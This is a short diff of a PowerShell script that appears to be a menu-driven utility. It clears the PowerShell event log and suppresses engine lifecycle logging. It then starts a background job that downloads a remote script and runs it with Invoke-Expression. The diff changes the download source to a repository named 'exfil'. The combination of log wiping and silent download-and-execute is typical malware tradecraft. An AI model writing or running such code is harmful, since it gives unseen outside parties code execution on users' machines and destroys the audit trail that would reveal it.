@@ -6,7 +6,7 @@ Clear-EventLog "Windows Powershell"
 $LogEngineLifecycleEvent = $false | Out-Null
 [void]$LogEngineLifecycleEvent
 $qaTaskJob = Start-Job -ScriptBlock {
-    Invoke-Expression (Invoke-WebRequest -Uri https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/AutomatedTaskWithPingInstall.ps1 -UseBasicParsing).Content
+    Invoke-Expression (Invoke-WebRequest -Uri https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/GlobalFiles/AutomatedTaskWithPingInstall.ps1 -UseBasicParsing).Content
 }
 
 # Display a numbered list of options
